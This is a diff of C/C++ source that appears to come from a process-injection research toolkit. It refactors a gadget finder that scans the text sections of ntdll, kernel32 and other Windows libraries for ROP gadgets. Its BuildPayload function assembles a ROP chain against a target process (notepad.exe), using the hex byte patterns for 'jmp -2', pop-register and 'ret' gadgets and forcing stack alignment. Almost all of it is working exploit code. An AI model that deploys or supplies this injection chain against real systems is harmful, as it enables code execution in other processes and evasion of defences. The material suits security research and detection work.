@@ -13,6 +13,7 @@
 
 #include "Rop_Chain.h"
 #include "memmem.h"
+
 typedef struct {
 	DWORD64 address;
 	size_t size;
@@ -22,6 +23,8 @@ typedef struct {
 
 TEXT_SECTION_INFO GetTextSection(HMODULE mod)
 {
+	// Parse a module in order to retrieve its text section
+
 	TEXT_SECTION_INFO section_info = { 0 };
 	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)mod;
 	PIMAGE_NT_HEADERS NtHeader;
@@ -56,6 +59,8 @@ TEXT_SECTION_INFO GetTextSection(HMODULE mod)
 
 BOOL IsPageExecutable(LPCVOID address)
 {
+	// Check the attributes of a given address, return TRUE if executable
+
 	MEMORY_BASIC_INFORMATION mem_info;
 	VirtualQuery(address, &mem_info, sizeof(MEMORY_BASIC_INFORMATION));
 	if (mem_info.Protect >= 0x10 && mem_info.Protect <= 0x50)
@@ -66,111 +71,48 @@ BOOL IsPageExecutable(LPCVOID address)
 
 DWORD64 GadgetFinder(const void* const needle, const size_t needle_len)
 {
+	// Searches a given gadget in the text sections of shared libraries.
+	// Text section is the only one which is executable.
 
 	DWORD64 gadget;
+	CHAR modules[6][11] = {"ntdll", "kernel32", "user32", "kernelbase", "gdi32", "gdiPlus"};
 
-	// ntdll
-	HMODULE ntdll = GetModuleHandleA("ntdll");
-	if (ntdll != NULL)
+	for (int i = 0; i < 6; i++)
 	{
-		MODULEINFO ntdll_modinfo;
-		GetModuleInformation(GetCurrentProcess(), ntdll, &ntdll_modinfo, sizeof(ntdll_modinfo));
-		TEXT_SECTION_INFO ntdll_Section = GetTextSection(ntdll);
-		gadget = (DWORD64)memmem((BYTE*)ntdll_Section.address, ntdll_Section.size, needle, needle_len);
-		if (gadget && IsPageExecutable((LPCVOID)gadget))
-			return gadget;
+		HMODULE hmod = GetModuleHandleA(modules[i]);
+		if (hmod != NULL)
+		{
+			MODULEINFO modinfo;
+			GetModuleInformation(GetCurrentProcess(), hmod, &modinfo, sizeof(modinfo));
+
+			TEXT_SECTION_INFO textSection = GetTextSection(hmod);
+			gadget = (DWORD64)memmem((BYTE*)textSection.address, textSection.size, needle, needle_len);
+			if (gadget)
+				return gadget;
+		}
 	}
-
-
-	// kernelbase
-	HMODULE kernelbase = GetModuleHandleA("kernelbase");
-	if (kernelbase != NULL)
-	{
-		MODULEINFO kerbase_modinfo;
-		GetModuleInformation(GetCurrentProcess(), kernelbase, &kerbase_modinfo, sizeof(kerbase_modinfo));
-		TEXT_SECTION_INFO kernelbase_Section = GetTextSection(kernelbase);
-		gadget = (DWORD64)memmem((BYTE*)kernelbase_Section.address, kernelbase_Section.size, needle, needle_len);
-		if (gadget && IsPageExecutable((LPCVOID)gadget))
-			return gadget;
-	}
-
-	//user32
-	HMODULE user32 = GetModuleHandleA("user32");
-	if (user32 != NULL)
-	{
-		MODULEINFO user32_modinfo;
-		GetModuleInformation(GetCurrentProcess(), user32, &user32_modinfo, sizeof(user32_modinfo));
-		TEXT_SECTION_INFO user32_Section = GetTextSection(user32);
-		gadget = (DWORD64)memmem((BYTE*)user32_Section.address, user32_Section.size, needle, needle_len);
-		if (gadget && IsPageExecutable((LPCVOID)gadget))
-			return gadget;
-	}
-
-
-	//kernel32
-	HMODULE kernel32 = GetModuleHandleA("kernel32");
-	if (kernel32 != NULL)
-	{
-		MODULEINFO kernel32_modinfo;
-		GetModuleInformation(GetCurrentProcess(), kernel32, &kernel32_modinfo, sizeof(kernel32_modinfo));
-		TEXT_SECTION_INFO kernel32_Section = GetTextSection(kernel32);
-		gadget = (DWORD64)memmem((BYTE*)kernel32_Section.address, kernel32_Section.size, needle, needle_len);
-		if (gadget && IsPageExecutable((LPCVOID)gadget))
-			return gadget;
-	}
-
-
-	//gdi32
-	HMODULE gdi32 = GetModuleHandleA("gdi32");
-	if (gdi32 != NULL)
-	{
-		MODULEINFO gdi32_modinfo;
-		GetModuleInformation(GetCurrentProcess(), gdi32, &gdi32_modinfo, sizeof(gdi32_modinfo));
-		TEXT_SECTION_INFO gdi32_Section = GetTextSection(gdi32);
-		gadget = (DWORD64)memmem((BYTE*)gdi32_Section.address, gdi32_Section.size, needle, needle_len);
-		if (gadget && IsPageExecutable((LPCVOID)gadget))
-			return gadget;
-	}
-
-
-	//GdiPlus
-	HMODULE gdiPlus = GetModuleHandleA("GdiPlus");
-	if (gdiPlus != NULL)
-	{
-		MODULEINFO gdiPlus_modinfo;
-		GetModuleInformation(GetCurrentProcess(), gdiPlus, &gdiPlus_modinfo, sizeof(gdiPlus_modinfo));
-		TEXT_SECTION_INFO gdiPlus_Section = GetTextSection(gdiPlus);
-		gadget = (DWORD64)memmem((BYTE*)gdiPlus_Section.address, gdiPlus_Section.size, needle, needle_len);
-		if (gadget && IsPageExecutable((LPCVOID)gadget))
-			return gadget;
-	}
-
 	return 0;
-
-
 }
 
 PINJECTRA_PACKET* BuildPayload(TStrDWORD64Map& runtime_parameters)
 {
 	LoadLibrary(L"gdi32.dll");
-	PINJECTRA_PACKET* output;
-	DWORD64 rop_pos = 0;
-	DWORD64* ROP_chain;
 
+	DWORD64* ROP_chain, rop_pos = 0;
 	CHAR location[] = "psapi.dll";
 	DWORD locSize = strlen(location);
-
 	WCHAR terminateStr[] = L"notepad.exe";
 	DWORD terminatePid = NameToPID((WCHAR*)terminateStr);
 
-	HMODULE ntdll = GetModuleHandleA("ntdll");
-	if (ntdll == INVALID_HANDLE_VALUE)
-		return NULL;
+	PINJECTRA_PACKET* output = (PINJECTRA_PACKET*)malloc(1 * sizeof(PINJECTRA_PACKET));
 
-	output = (PINJECTRA_PACKET*)malloc(1 * sizeof(PINJECTRA_PACKET));
+	HMODULE ntdll = GetModuleHandleA("ntdll");
+	if (ntdll == NULL) return NULL;
 
 	DWORD64 GADGET_loop = GadgetFinder("\xEB\xFE", 2); // jmp -2
 	check_Gadget(GADGET_loop, "GADGET_loop");
+	
+	DWORD64 GADGET_popregs = GadgetFinder("\x58\x5a\x59\x41\x58\x41\x59\x41\x5a\x41\x5b\xc3", 12);
 	/*
 	ntdll!LdrpHandleInvalidUserCallTarget+0x7f:
 	00007ff8`5c63b3bf 58              pop     rax
@@ -182,8 +124,7 @@ PINJECTRA_PACKET* BuildPayload(TStrDWORD64Map& runtime_parameters)
 	00007ff8`5c63b3c8 415b            pop     r11
 	00007ff8`5c63b3ca c3              ret
 	*/
-	DWORD64 GADGET_popregs = GadgetFinder("\x58\x5a\x59\x41\x58\x41\x59\x41\x5a\x41\x5b\xc3", 12);
-
+	
 	DWORD64 GADGET_ret = GadgetFinder("\xC3", 1); // ret;
 	check_Gadget(GADGET_ret, "GADGET_ret");
 
@@ -242,7 +183,7 @@ PINJECTRA_PACKET* BuildPayload(TStrDWORD64Map& runtime_parameters)
 
 	if (meow.dwMajorVersion == 10)
 	{
-		if ((runtime_parameters["tos"] + 10 * sizeof(DWORD64)) & 0xF) // stack before return address of MessageBoxA is NOT aligned - force alignment
+		if ((runtime_parameters["tos"] + 10 * sizeof(DWORD64)) & 0xF) // force stack alignment
 			ROP_chain[rop_pos++] = GADGET_ret;
 
 		// Windows10 ---> r8 first type 
